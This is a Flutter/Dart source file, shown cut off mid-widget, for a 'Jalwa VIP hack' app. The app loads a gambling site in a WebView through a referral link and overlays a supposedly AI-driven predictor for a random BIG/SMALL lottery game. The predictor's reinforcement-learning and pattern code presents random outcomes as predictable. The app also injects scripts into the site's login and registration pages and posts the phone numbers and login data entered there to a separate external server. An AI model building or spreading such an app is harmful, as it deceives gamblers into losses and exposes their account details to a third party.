import 'dart:async';
import 'dart:math';
import 'dart:ui'; // Add this import for ImageFilter
import 'dart:convert'; // Add back the import for json encoding/decoding
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:vr_hack/predictionbar.dart';
import 'package:vr_hack/register%20popup.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:webview_flutter_android/webview_flutter_android.dart';
import 'package:webview_flutter_wkwebview/webview_flutter_wkwebview.dart';
import 'package:vr_hack/hackereffect.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:vr_hack/firebase_options.dart';
import 'package:http/http.dart' as http;
import 'package:google_fonts/google_fonts.dart';
import 'package:flutter/rendering.dart';

// Simplified Firebase initialization
bool _isFirebaseInitialized = false;

Future<void> initializeFirebase() async {
  if (!_isFirebaseInitialized) {
    try {
      await Firebase.initializeApp(
        options: DefaultFirebaseOptions.currentPlatform,
      );
      // Initialize Remote Config
      final remoteConfig = FirebaseRemoteConfig.instance;
      await remoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(minutes: 1),
        minimumFetchInterval: const Duration(hours: 1),
      ));

      await remoteConfig.fetchAndActivate();

      _isFirebaseInitialized = true;
      print('Firebase Remote Config initialized successfully');
    } catch (e) {
      print('Firebase initialization error: $e');
    }
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeFirebase();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Jalwa VIP hack',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const HackWingoApp(),
    );
  }
}

class HackWingoApp extends StatefulWidget {
  const HackWingoApp({Key? key}) : super(key: key);

  @override
  State<HackWingoApp> createState() => _HackWingoAppState();
}

class GameScreen extends StatefulWidget {
  @override
  _GameScreenState createState() => _GameScreenState();
}

class _GameScreenState extends State<GameScreen> {
  bool _showPredictionBar = false;
  String gameTimer = "00:30";
  String wins = "0";
  String losses = "0";
  String prediction = "Big";
  String periodNumber = "12";
  bool _isMandatoryStarted = false;

  void _handleMandatoryStart() {
    setState(() {
      _isMandatoryStarted = true;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: PredictionAppBar(
        gameTimer: gameTimer,
        wins: wins,
        losses: losses,
        prediction: prediction,
        periodNumber: periodNumber,
        onMandatoryStart: _handleMandatoryStart,
        isMandatoryStarted: _isMandatoryStarted,
      ),
      body: Center(
        child: ElevatedButton(
          onPressed: () {
            setState(() {
              wins = "1";
              losses = "0";
            });
          },
          child: const Text("Update Results"),
        ),
      ),
    );
  }
}

class CompletePaymentScreen extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: const Center(
        child: Text(
          "Complete Payment",
          style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
        ),
      ),
    );
  }
}

class PredictionState {
  final List<int> numbers;
  final List<String> colors;

  PredictionState(this.numbers, this.colors);

  String get key => numbers.join(',') + '|' + colors.join(',');
}

class AIDecision {
  double bigProbability;
  double confidence;
  String reasoning;

  AIDecision(this.bigProbability, this.confidence, this.reasoning);
}

class ReinforcementLearner {
  final Map<String, Map<bool, double>> qTable = {};
  final Map<String, int> stateVisitCount = {};
  final double learningRate = 0.15; // Slightly increased for faster learning
  final double discountFactor =
      0.95; // Higher discount for longer-term thinking
  double explorationRate = 0.2; // Start with higher exploration
  final double minExplorationRate = 0.05;
  final double explorationDecay = 0.995;

  List<PredictionState> stateHistory = [];
  List<bool> actionHistory = [];
  List<double> rewardHistory = [];
  List<double> confidenceHistory = [];
  Map<String, double> stateValues = {};

  double getQValue(PredictionState state, bool action) {
    return qTable[state.key]?[action] ?? 0.0;
  }

  void updateQValue(PredictionState state, bool action, double reward,
      PredictionState? nextState) {
    qTable.putIfAbsent(state.key, () => {});
    qTable[state.key]!.putIfAbsent(action, () => 0.0);

    // Track state visits for UCB exploration
    stateVisitCount[state.key] = (stateVisitCount[state.key] ?? 0) + 1;

    double oldValue = qTable[state.key]![action]!;

    // Enhanced Q-learning with next state consideration
    double maxNextQValue = 0.0;
    if (nextState != null) {
      double bigNextQ = getQValue(nextState, true);
      double smallNextQ = getQValue(nextState, false);
      maxNextQValue = max(bigNextQ, smallNextQ);
    }

    // Temporal difference learning with next state
    double tdTarget = reward + discountFactor * maxNextQValue;
    double newValue = oldValue + learningRate * (tdTarget - oldValue);

    qTable[state.key]![action] = newValue;

    // Update state value for better evaluation
    stateValues[state.key] =
        max(getQValue(state, true), getQValue(state, false));
  }

  AIDecision predict(PredictionState currentState) {
    // Adaptive exploration rate
    explorationRate =
        max(minExplorationRate, explorationRate * explorationDecay);

    // Upper Confidence Bound (UCB) exploration
    if (Random().nextDouble() < explorationRate ||
        _shouldExploreUCB(currentState)) {
      bool randomAction = Random().nextBool();
      return AIDecision(randomAction ? 0.7 : 0.3, 0.4,
          "Exploration mode (ε=${explorationRate.toStringAsFixed(3)})");
    }

    double bigValue = getQValue(currentState, true);
    double smallValue = getQValue(currentState, false);

    // Add confidence bonus based on state visits
    int visits = stateVisitCount[currentState.key] ?? 0;
    double confidenceBonus = visits > 5 ? 0.1 : 0.0;

    double totalValue = bigValue.abs() + smallValue.abs();

    if (totalValue < 0.01) {
      // Use pattern-based fallback when no Q-values exist
      return _patternBasedPrediction(currentState);
    }

    // Softmax action selection for better probability distribution
    double temperature = 2.0; // Controls exploration vs exploitation
    double bigExp = exp(bigValue / temperature);
    double smallExp = exp(smallValue / temperature);
    double probability = bigExp / (bigExp + smallExp);

    // Enhanced confidence calculation
    double valueDifference = (bigValue - smallValue).abs();
    double baseConfidence = min(valueDifference / 2.0, 0.8);
    double confidence = (baseConfidence + confidenceBonus).clamp(0.3, 0.9);

    String reasoning =
        _generateDetailedReasoning(bigValue, smallValue, visits, probability);

    return AIDecision(probability, confidence, reasoning);
  }

  bool _shouldExploreUCB(PredictionState state) {
    int totalVisits = stateVisitCount.values.fold(0, (a, b) => a + b);
    int stateVisits = stateVisitCount[state.key] ?? 0;

    if (totalVisits < 10 || stateVisits < 3) return true;

    // UCB exploration criterion
    double ucbValue = sqrt(log(totalVisits) / stateVisits);
    return ucbValue > 1.5; // Threshold for exploration
  }

  AIDecision _patternBasedPrediction(PredictionState state) {
    if (state.numbers.isEmpty) {
      return AIDecision(0.5, 0.3, "No data - random prediction");
    }

    // Simple pattern analysis as fallback
    int recentBigCount = state.numbers.take(5).where((n) => n >= 5).length;
    double probability = recentBigCount > 2 ? 0.3 : 0.7; // Counter-trend

    return AIDecision(probability, 0.4, "Pattern-based fallback");
  }

  String _generateDetailedReasoning(
      double bigValue, double smallValue, int visits, double probability) {
    List<String> reasons = [];

    reasons.add(
        "Q-values: BIG=${bigValue.toStringAsFixed(3)}, SMALL=${smallValue.toStringAsFixed(3)}");
    reasons.add("State visits: $visits");
    reasons.add(
        "Confidence: ${((bigValue - smallValue).abs() * 50).toStringAsFixed(1)}%");
    reasons.add(
        "Exploration rate: ${(explorationRate * 100).toStringAsFixed(1)}%");

    return reasons.join(" | ");
  }

  void learn(PredictionState state, bool action, double reward,
      {PredictionState? nextState}) {
    stateHistory.add(state);
    actionHistory.add(action);
    rewardHistory.add(reward);

    // Enhanced reward calculation with momentum
    double enhancedReward = _calculateEnhancedReward(reward);

    // Update Q-value with next state information
    updateQValue(state, action, enhancedReward, nextState);

    // Experience replay for better learning
    if (stateHistory.length > 20) {
      _performExperienceReplay();
    }

    // Maintain reasonable history size
    if (stateHistory.length > 50) {
      stateHistory.removeAt(0);
      actionHistory.removeAt(0);
      rewardHistory.removeAt(0);
    }

    // Temporal difference learning for recent experiences
    _updateRecentExperiences();
  }

  double _calculateEnhancedReward(double baseReward) {
    // Add momentum based on recent performance
    if (rewardHistory.length >= 3) {
      double recentAverage = rewardHistory.take(3).reduce((a, b) => a + b) / 3;
      double momentum = recentAverage * 0.2; // 20% momentum factor
      return baseReward + momentum;
    }
    return baseReward;
  }

  void _performExperienceReplay() {
    // Randomly sample from experience for additional learning
    int replayCount = min(5, stateHistory.length);

    for (int i = 0; i < replayCount; i++) {
      int randomIndex = Random().nextInt(stateHistory.length);

      PredictionState replayState = stateHistory[randomIndex];
      bool replayAction = actionHistory[randomIndex];
      double replayReward = rewardHistory[randomIndex];

      // Find next state if available
      PredictionState? nextReplayState;
      if (randomIndex < stateHistory.length - 1) {
        nextReplayState = stateHistory[randomIndex + 1];
      }

      // Reduced learning rate for replay
      double originalLearningRate = learningRate;
      double replayLearningRate = learningRate * 0.5;

      // Temporarily adjust learning rate
      updateQValue(
          replayState, replayAction, replayReward * 0.8, nextReplayState);
    }
  }

  void _updateRecentExperiences() {
    // Update recent experiences with temporal difference
    int lookback = min(3, stateHistory.length - 1);

    for (int i = 0; i < lookback; i++) {
      int index = stateHistory.length - 1 - i;
      if (index <= 0) break;

      PredictionState currentState = stateHistory[index];
      bool currentAction = actionHistory[index];
      double currentReward = rewardHistory[index];
      PredictionState previousState = stateHistory[index - 1];

      // Discounted reward propagation
      double discountedReward = currentReward * pow(discountFactor, i + 1);
      updateQValue(previousState, actionHistory[index - 1], discountedReward,
          currentState);
    }
  }

  // Method to get current learning statistics
  Map<String, dynamic> getLearningStats() {
    int totalStates = qTable.length;
    int totalVisits = stateVisitCount.values.fold(0, (a, b) => a + b);
    double avgReward = rewardHistory.isEmpty
        ? 0.0
        : rewardHistory.reduce((a, b) => a + b) / rewardHistory.length;

    return {
      'totalStates': totalStates,
      'totalVisits': totalVisits,
      'explorationRate': explorationRate,
      'avgReward': avgReward,
      'experienceSize': stateHistory.length,
    };
  }

  // Method to reset learning if performance is consistently poor
  void resetLearning() {
    qTable.clear();
    stateVisitCount.clear();
    stateValues.clear();
    explorationRate = 0.2; // Reset exploration
    print("AI learning reset - starting fresh");
  }
}

class AdvancedPredictor {
  final List<int> numbers;
  final List<String> colors;
  final int wins;
  final int losses;

  // Enhanced pattern weights with dynamic adjustment
  static const double TREND_WEIGHT = 0.30;
  static const double COLOR_WEIGHT = 0.25;
  static const double PATTERN_WEIGHT = 0.30;
  static const double PERFORMANCE_WEIGHT = 0.15;

  AdvancedPredictor(this.numbers, this.colors, this.wins, this.losses);

  Map<String, dynamic> predict() {
    if (numbers.isEmpty) {
      return {
        'prediction': 'BIG',
        'confidence': 0.5,
        'reasoning': 'Insufficient data'
      };
    }

    // Calculate different factors with enhanced algorithms
    double trendProbability = _analyzeTrendAdvanced();
    double colorProbability = _analyzeColorsAdvanced();
    double patternProbability = _analyzePatternsAdvanced();
    double performanceProbability = _analyzePerformanceAdvanced();

    // Dynamic weight adjustment based on recent performance
    Map<String, double> weights = _calculateDynamicWeights();

    // Weighted combination with dynamic weights
    double finalProbability = (trendProbability * weights['trend']!) +
        (colorProbability * weights['color']!) +
        (patternProbability * weights['pattern']!) +
        (performanceProbability * weights['performance']!);

    // Apply sigmoid function for better probability distribution
    finalProbability = _sigmoid(finalProbability);

    // Calculate confidence with multiple factors
    double confidence = _calculateAdvancedConfidence(finalProbability);

    String reasoning = _generateAdvancedReasoning(trendProbability,
        colorProbability, patternProbability, performanceProbability, weights);

    return {
      'prediction': finalProbability > 0.5 ? 'BIG' : 'SMALL',
      'probability': finalProbability,
      'confidence': confidence,
      'reasoning': reasoning
    };
  }

  // Enhanced trend analysis with multiple timeframes
  double _analyzeTrendAdvanced() {
    if (numbers.isEmpty) return 0.5;

    List<int> recent5 = numbers.take(5).toList();
    List<int> recent10 = numbers.take(10).toList();
    List<int> recent20 = numbers.take(20).toList();

    double shortTermBias = _calculateBias(recent5);
    double mediumTermBias = _calculateBias(recent10);
    double longTermBias = _calculateBias(recent20);

    // Weighted combination of different timeframes
    double trendBias =
        (shortTermBias * 0.5) + (mediumTermBias * 0.3) + (longTermBias * 0.2);

    // Anti-streak logic - stronger counter-trend after long streaks
    int currentStreak = _calculateCurrentStreak();
    double streakAdjustment = _calculateStreakAdjustment(currentStreak);

    // Volatility analysis
    double volatility = _calculateVolatility(recent10);
    double volatilityAdjustment = volatility > 0.6 ? 0.1 : -0.1;

    double probability =
        0.5 + trendBias + streakAdjustment + volatilityAdjustment;
    return probability.clamp(0.1, 0.9);
  }

  // Enhanced color analysis with sequence patterns
  double _analyzeColorsAdvanced() {
    if (colors.isEmpty) return 0.5;

    double probability = 0.5;
    List<String> recent = colors.take(8).toList();

    // Color distribution analysis
    Map<String, int> colorCount = {'red': 0, 'green': 0, 'violet': 0};
    for (String color in recent) {
      if (color.contains('red')) colorCount['red'] = colorCount['red']! + 1;
      if (color.contains('green'))
        colorCount['green'] = colorCount['green']! + 1;
      if (color.contains('violet'))
        colorCount['violet'] = colorCount['violet']! + 1;
    }

    // Enhanced color logic with historical patterns
    double redRatio = colorCount['red']! / recent.length;
    double greenRatio = colorCount['green']! / recent.length;
    double violetRatio = colorCount['violet']! / recent.length;

    // Color-based probability adjustment
    if (redRatio > 0.6) {
      probability += 0.25; // Red tends toward BIG
    } else if (greenRatio > 0.6) {
      probability -= 0.25; // Green tends toward SMALL
    }

    // Violet creates uncertainty but can indicate reversal
    if (violetRatio > 0.4) {
      probability = 0.5 + (Random().nextDouble() - 0.5) * 0.3;
    }

    // Color sequence patterns
    if (recent.length >= 3) {
      String lastThreeColors = recent.take(3).join('');
      if (lastThreeColors.contains('red') &&
          lastThreeColors.contains('green')) {
        probability +=
            recent[0].contains('red') ? -0.2 : 0.2; // Alternating pattern
      }
    }

    return probability.clamp(0.1, 0.9);
  }

  // Enhanced pattern recognition with multiple algorithms
  double _analyzePatternsAdvanced() {
    if (numbers.length < 6) return 0.5;

    double probability = 0.5;
    List<int> recent = numbers.take(15).toList();

    // Fibonacci-like sequence detection
    double fibonacciScore = _detectFibonacciPattern(recent);

    // Arithmetic progression detection
    double arithmeticScore = _detectArithmeticPattern(recent);

    // Cyclical pattern detection
    double cyclicalScore = _detectCyclicalPattern(recent);

    // Hot/Cold number analysis
    double hotColdScore = _analyzeHotColdNumbers(recent);

    // Sum pattern analysis
    double sumPatternScore = _analyzeSumPatterns(recent);

    // Combine all pattern scores
    probability += (fibonacciScore * 0.2) +
        (arithmeticScore * 0.2) +
        (cyclicalScore * 0.2) +
        (hotColdScore * 0.2) +
        (sumPatternScore * 0.2);

    return probability.clamp(0.1, 0.9);
  }

  // Enhanced performance analysis with adaptive learning
  double _analyzePerformanceAdvanced() {
    if (wins + losses == 0) return 0.5;

    double winRate = wins / (wins + losses);
    double probability = 0.5;

    // Adaptive strategy based on performance
    if (winRate > 0.7) {
      probability += 0.3; // High confidence in current strategy
    } else if (winRate > 0.6) {
      probability += 0.15; // Moderate confidence
    } else if (winRate < 0.3) {
      probability = 1 - probability; // Invert strategy completely
    } else if (winRate < 0.4) {
      probability += Random().nextDouble() * 0.4 - 0.2; // Add randomness
    }

    // Recent performance trend
    if (numbers.length >= 5) {
      int recentWins = _calculateRecentWins(5);
      double recentWinRate = recentWins / 5.0;
      probability += (recentWinRate - 0.5) * 0.2;
    }

    return probability.clamp(0.1, 0.9);
  }

  // Helper methods for enhanced analysis
  double _calculateBias(List<int> nums) {
    if (nums.isEmpty) return 0.0;
    int bigCount = nums.where((n) => n >= 5).length;
    return (bigCount / nums.length) - 0.5;
  }

  int _calculateCurrentStreak() {
    if (numbers.isEmpty) return 0;
    bool isStreakBig = numbers[0] >= 5;
    int streak = 1;

    for (int i = 1; i < numbers.length && i < 10; i++) {
      if ((numbers[i] >= 5) == isStreakBig) {
        streak++;
      } else {
        break;
      }
    }
    return streak;
  }

  double _calculateStreakAdjustment(int streak) {
    if (streak <= 2) return 0.0;
    if (streak <= 4) return -0.1 * (numbers[0] >= 5 ? 1 : -1);
    if (streak <= 6) return -0.2 * (numbers[0] >= 5 ? 1 : -1);
    return -0.3 * (numbers[0] >= 5 ? 1 : -1);
  }

  double _calculateVolatility(List<int> nums) {
    if (nums.length < 3) return 0.5;
    int changes = 0;
    for (int i = 1; i < nums.length; i++) {
      if ((nums[i] >= 5) != (nums[i - 1] >= 5)) changes++;
    }
    return changes / (nums.length - 1);
  }

  double _detectFibonacciPattern(List<int> nums) {
    // Simplified Fibonacci detection
    if (nums.length < 3) return 0.0;
    int fibMatches = 0;
    for (int i = 2; i < nums.length && i < 8; i++) {
      if (nums[i] == (nums[i - 1] + nums[i - 2]) % 10) fibMatches++;
    }
    return fibMatches > 2 ? 0.3 : 0.0;
  }

  double _detectArithmeticPattern(List<int> nums) {
    if (nums.length < 4) return 0.0;
    List<int> diffs = [];
    for (int i = 1; i < nums.length && i < 6; i++) {
      diffs.add(nums[i] - nums[i - 1]);
    }

    bool isArithmetic = diffs.every((d) => d == diffs[0]);
    return isArithmetic ? 0.25 : 0.0;
  }

  double _detectCyclicalPattern(List<int> nums) {
    if (nums.length < 6) return 0.0;

    // Check for repeating cycles of length 2, 3, 4
    for (int cycleLength = 2; cycleLength <= 4; cycleLength++) {
      bool isCyclical = true;
      for (int i = cycleLength; i < nums.length && i < cycleLength * 3; i++) {
        if (nums[i] != nums[i % cycleLength]) {
          isCyclical = false;
          break;
        }
      }
      if (isCyclical) return 0.3;
    }
    return 0.0;
  }

  double _analyzeHotColdNumbers(List<int> nums) {
    Map<int, int> frequency = {};
    for (int num in nums) {
      frequency[num] = (frequency[num] ?? 0) + 1;
    }

    int mostFrequent =
        frequency.entries.reduce((a, b) => a.value > b.value ? a : b).key;
    return mostFrequent >= 5 ? 0.2 : -0.2;
  }

  double _analyzeSumPatterns(List<int> nums) {
    if (nums.length < 3) return 0.0;

    List<int> sums = [];
    for (int i = 2; i < nums.length && i < 8; i++) {
      sums.add((nums[i - 2] + nums[i - 1] + nums[i]) % 10);
    }

    int bigSums = sums.where((s) => s >= 5).length;
    return (bigSums / sums.length) > 0.6 ? 0.15 : -0.15;
  }

  int _calculateRecentWins(int count) {
    // This would need to be implemented based on actual win/loss tracking
    // For now, return estimated based on win rate
    double winRate = wins / (wins + losses);
    return (winRate * count).round();
  }

  Map<String, double> _calculateDynamicWeights() {
    double totalGames = (wins + losses).toDouble();
    if (totalGames < 10) {
      // Use default weights for insufficient data
      return {
        'trend': TREND_WEIGHT,
        'color': COLOR_WEIGHT,
        'pattern': PATTERN_WEIGHT,
        'performance': PERFORMANCE_WEIGHT,
      };
    }

    double winRate = wins / totalGames;

    // Adjust weights based on performance
    if (winRate > 0.6) {
      // Good performance - trust current strategy more
      return {
        'trend': TREND_WEIGHT * 1.2,
        'color': COLOR_WEIGHT * 1.1,
        'pattern': PATTERN_WEIGHT * 1.1,
        'performance': PERFORMANCE_WEIGHT * 1.3,
      };
    } else if (winRate < 0.4) {
      // Poor performance - rely more on patterns
      return {
        'trend': TREND_WEIGHT * 0.8,
        'color': COLOR_WEIGHT * 0.9,
        'pattern': PATTERN_WEIGHT * 1.4,
        'performance': PERFORMANCE_WEIGHT * 0.7,
      };
    }

    // Average performance - balanced weights
    return {
      'trend': TREND_WEIGHT,
      'color': COLOR_WEIGHT,
      'pattern': PATTERN_WEIGHT,
      'performance': PERFORMANCE_WEIGHT,
    };
  }

  double _sigmoid(double x) {
    return 1 / (1 + exp(-6 * (x - 0.5)));
  }

  double _calculateAdvancedConfidence(double probability) {
    // Multi-factor confidence calculation
    double deviationConfidence = (probability - 0.5).abs() * 2;

    double dataQualityConfidence = min(numbers.length / 20, 1.0);

    double performanceConfidence = 0.5;
    if (wins + losses > 0) {
      double winRate = wins / (wins + losses);
      performanceConfidence = 1 - (winRate - 0.5).abs() * 2;
    }

    double volatilityConfidence =
        1 - _calculateVolatility(numbers.take(10).toList());

    return (deviationConfidence * 0.3 +
            dataQualityConfidence * 0.25 +
            performanceConfidence * 0.25 +
            volatilityConfidence * 0.2)
        .clamp(0.3, 0.95);
  }

  String _generateAdvancedReasoning(double trend, double color, double pattern,
      double performance, Map<String, double> weights) {
    List<String> reasons = [];

    if ((trend - 0.5).abs() > 0.2) {
      reasons.add(
          '${trend > 0.5 ? 'BIG' : 'SMALL'} trend detected (${(trend * 100).toStringAsFixed(1)}%)');
    }

    if ((color - 0.5).abs() > 0.2) {
      reasons.add(
          'Color analysis suggests ${color > 0.5 ? 'BIG' : 'SMALL'} (${(color * 100).toStringAsFixed(1)}%)');
    }

    if ((pattern - 0.5).abs() > 0.2) {
      reasons.add(
          'Pattern recognition indicates ${pattern > 0.5 ? 'BIG' : 'SMALL'} (${(pattern * 100).toStringAsFixed(1)}%)');
    }

    if ((performance - 0.5).abs() > 0.2) {
      reasons.add(
          'Performance history suggests ${performance > 0.5 ? 'BIG' : 'SMALL'} (${(performance * 100).toStringAsFixed(1)}%)');
    }

    // Add dynamic weight information
    String dominantFactor =
        weights.entries.reduce((a, b) => a.value > b.value ? a : b).key;
    reasons.add('Primary factor: $dominantFactor');

    return reasons.join(' | ');
  }
}

class _HackWingoAppState extends State<HackWingoApp> {
  late WebViewController _webViewController;
  bool _isAppEnabled = true;
  String _currentUrl = '';
  String _initialUrl = '';
  bool _isUrlLoaded = false;
  bool _isMandatoryStarted = false;
  bool _showStartButton = true;
  Offset _predictionWindowOffset = const Offset(10, 80);
  bool _isPredictionWindowVisible = true;
  bool _isPredictionRunning = false;

  final String correctUserNumber = "_username_";
  final String correctPassword = "_password_";

// Declare initial values for the game state
  String _gameTimer = "Loading...";
  String _gamePeriod = "Loading...";
  String _prediction = "Loading...";
  String _walletBalance = "Loading...";

  int _wins = 0;
  int _losses = 0;
  Color _predictionColor = Colors.green;

  Timer? _updateTimer;
  bool _showPredictionBar = false;

  // Add these variables to track previous prediction and result
  String _lastPrediction = '';
  String _lastResult = '';

  bool _isAppChecked = false;

  // Add these variables
  late String _validUsername = '';
  late String _validPassword = '';

  var i;

  // Add a variable to track the button state
  bool _isLoginButtonEnabled = false;

  final String apiUrl =
      'https://auth-d0ci.onrender.com/api'; // Replace X with your local IP

  late ReinforcementLearner _ai;
  List<int> _recentNumbers = [];
  List<String> _recentColors = [];
  double _lastConfidence = 0.5;

  @override
  void initState() {
    super.initState();
    print("InitState called");
    _initializeWebView();
    _loadInitialUrl();
    _checkAppStatus();
    _showHackerEffectPopup();
    _startTimerUpdates();
    _startPredictionUpdates();
    _checkRemoteConfig();
    _ai = ReinforcementLearner();
  }

  Future<void> _initializeWebView() async {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (String url) async {
            if (url.contains('login')) {
              await _injectLoginHandler();
            } else if (url.contains('register')) {
              await _injectRegistrationHandler();
            }
            _checkPageUrl(url);
          },
        ),
      )
      ..addJavaScriptChannel(
        'Debug',
        onMessageReceived: (JavaScriptMessage message) {
          print('Debug: ${message.message}');
        },
      )
      ..addJavaScriptChannel(
        'CheckUsername',
        onMessageReceived: (JavaScriptMessage message) async {
          try {
            final phone = message.message;
            print('Checking phone number: $phone');

            final response = await http.post(
              Uri.parse('https://auth-d0ci.onrender.com/api/check-user'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'phone': phone}),
            );

            if (response.statusCode == 200) {
              final data = jsonDecode(response.body);
              final isValid = data['exists'] ?? false;
              print('Phone validation result: $isValid');

              await _webViewController.runJavaScript("""
                window.dispatchEvent(new CustomEvent('phoneValidated', {
                  detail: { isValid: $isValid }
                }));
              """);
            } else {
              print('Error checking phone: ${response.statusCode}');
              await _webViewController.runJavaScript("""
                window.dispatchEvent(new CustomEvent('phoneValidated', {
                  detail: { isValid: false }
                }));
              """);
            }
          } catch (e) {
            print('Error checking phone: $e');
            await _webViewController.runJavaScript("""
              window.dispatchEvent(new CustomEvent('phoneValidated', {
                detail: { isValid: false }
              }));
            """);
          }
        },
      )
      ..addJavaScriptChannel(
        'Login',
        onMessageReceived: (JavaScriptMessage message) async {
          try {
            final data = jsonDecode(message.message);
            final response = await http.post(
              Uri.parse('https://auth-d0ci.onrender.com/api/login'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode(data),
            );

            if (response.statusCode == 200) {
              print('Login successful');
              _webViewController
                  .loadRequest(Uri.parse("https://www.jalwagame.win/#/"));
            } else {
              print('Login failed: ${response.body}');
            }
          } catch (e) {
            print('Login error: $e');
          }
        },
      );
  }

  Future<void> _loadInitialUrl() async {
    try {
      final remoteConfig = FirebaseRemoteConfig.instance;
      await remoteConfig.fetch();
      await remoteConfig.activate();

      setState(() {
        _initialUrl = remoteConfig.getString('jalwa');
        _isUrlLoaded = true;
        print('Loaded URL from Remote Config: $_initialUrl');
      });

      if (_initialUrl.isNotEmpty) {
        await _webViewController.loadRequest(Uri.parse(_initialUrl));
      } else {
        await _webViewController.loadRequest(
          Uri.parse(
              "https://www.jalwagame.win/#/register?invitationCode=51628510542"),
        );
      }
    } catch (e) {
      print('Error loading Remote Config: $e');
      setState(() {
        _initialUrl =
            "https://www.jalwagame.win/#/register?invitationCode=51628510542";
        _isUrlLoaded = true;
      });
      await _webViewController.loadRequest(Uri.parse(_initialUrl));
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        // Check if we can go back in WebView
        if (await _webViewController.canGoBack()) {
          _webViewController.goBack();
          return false;
        }

        // If we can't go back, show exit dialog
        final shouldPop = await showDialog<bool>(
          context: context,
          builder: (context) => AlertDialog(
            backgroundColor: const Color(0xFF2a2d36),
            title: const Text(
              'Exit App?',
              style: TextStyle(color: Colors.white),
            ),
            content: const Text(
              'Are you sure you want to exit the app?',
              style: TextStyle(color: Colors.white70),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.of(context).pop(false),
                child: const Text(
                  'No',
                  style: TextStyle(color: Colors.lightBlue),
                ),
              ),
              TextButton(
                onPressed: () => Navigator.of(context).pop(true),
                child: const Text(
                  'Yes',
                  style: TextStyle(color: Colors.red),
                ),
              ),
            ],
          ),
        );
        return shouldPop ?? false;
      },
      child: Scaffold(
        backgroundColor: Colors.black,
        body: SafeArea(
          child: !_isUrlLoaded
              ? Container(
                  color: Colors.black,
                  child: Stack(
                    children: [
                      // Matrix background
                      Positioned.fill(
                        child: AdvancedMatrixEffect(
                          height: MediaQuery.of(context).size.height,
                          width: MediaQuery.of(context).size.width,
                        ),
                      ),
                      // Loading indicator
                      const Center(
                        child: CircularProgressIndicator(
                          color: Colors.greenAccent,
                        ),
                      ),
                    ],
                  ),
                )
              : Container(
                  color: Colors.black,
                  child: Stack(
                    children: [
                      // Matrix background behind WebView
                      Positioned.fill(
                        child: AdvancedMatrixEffect(
                          height: MediaQuery.of(context).size.height,
                          width: MediaQuery.of(context).size.width,
                        ),
                      ),
                      // WebView with transparency
                      Positioned.fill(
                        child: Container(
                          decoration: BoxDecoration(
                            color: Colors.black.withOpacity(0.7),
                          ),
                          child: WebViewWidget(
                            controller: _webViewController,
                          ),
                        ),
                      ),
                      // Prediction Window
                      if (_showPredictionBar && _isPredictionWindowVisible)
                        Positioned(
                          left: _predictionWindowOffset.dx,
                          top: _predictionWindowOffset.dy,
                          child: Draggable(
                            feedback: PredictionWindow(
                              gameTimer: _gameTimer,
                              wins: _wins.toString(),
                              losses: _losses.toString(),
                              prediction: _prediction,
                              periodNumber: _gamePeriod,
                              isRunning: _isPredictionRunning,
                              onStart: _handleStart,
                              onStop: _handleStop,
                              onHide: () => setState(
                                  () => _isPredictionWindowVisible = false),
                            ),
                            childWhenDragging: Container(),
                            onDragEnd: (details) {
                              setState(() {
                                _predictionWindowOffset = details.offset;
                              });
                            },
                            child: PredictionWindow(
                              gameTimer: _gameTimer,
                              wins: _wins.toString(),
                              losses: _losses.toString(),
                              prediction: _prediction,
                              periodNumber: _gamePeriod,
                              isRunning: _isPredictionRunning,
                              onStart: _handleStart,
                              onStop: _handleStop,
                              onHide: () => setState(
                                  () => _isPredictionWindowVisible = false),
                            ),
                          ),
                        ),
                      // Show prediction window button
                      if (_showPredictionBar && !_isPredictionWindowVisible)
                        Positioned(
                          bottom: 20,
                          right: 20,
                          child: Container(
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              gradient: LinearGradient(
                                colors: [
                                  Colors.greenAccent,
                                  Colors.green.shade800
                                ],
                                begin: Alignment.topLeft,
                                end: Alignment.bottomRight,
                              ),
                              boxShadow: [
                                BoxShadow(
                                  color: Colors.greenAccent.withOpacity(0.3),
                                  blurRadius: 15,
                                  spreadRadius: 2,
                                ),
                              ],
                            ),
                            child: FloatingActionButton(
                              onPressed: () {
                                setState(() {
                                  _isPredictionWindowVisible = true;
                                });
                              },
                              backgroundColor: Colors.transparent,
                              elevation: 0,
                              child: const Icon(
                                Icons.visibility,
                                color: Colors.black,
                                size: 28,
                              ),
                            ),
                          ),
                        ),
                      // Start button overlay
                      if (_showStartButton &&
                          _currentUrl
                              .contains("/saasLottery/WinGo?gameCode=WinGo_"))
                        Positioned(
                          top: 0,
                          left: 0,
                          right: 0,
                          height: 205,
                          child: Container(
                            decoration: BoxDecoration(
                              gradient: LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Colors.black.withOpacity(0.9),
                                  Colors.black.withOpacity(0.7),
                                  Colors.transparent,
                                ],
                              ),
                            ),
                            child: BackdropFilter(
                              filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                              child: Center(
                                child: TweenAnimationBuilder(
                                  tween: Tween<double>(begin: 0.95, end: 1.0),
                                  duration: const Duration(milliseconds: 2000),
                                  curve: Curves.easeInOutCubic,
                                  builder: (context, double value, child) {
                                    return Transform.scale(
                                      scale: value,
                                      child: Container(
                                        width: 160,
                                        height: 48,
                                        decoration: BoxDecoration(
                                          borderRadius:
